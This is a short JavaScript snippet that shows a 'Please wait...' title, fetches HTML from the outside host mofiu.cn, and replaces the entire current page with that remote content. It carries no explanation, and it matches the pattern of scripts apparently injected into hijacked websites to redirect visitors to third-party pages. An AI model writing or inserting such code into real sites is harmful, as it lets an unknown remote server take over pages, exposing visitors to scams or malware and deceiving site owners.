document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;

function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "http://mofiu.cn/i.html#" + Date.now(), !0);
xhr.send();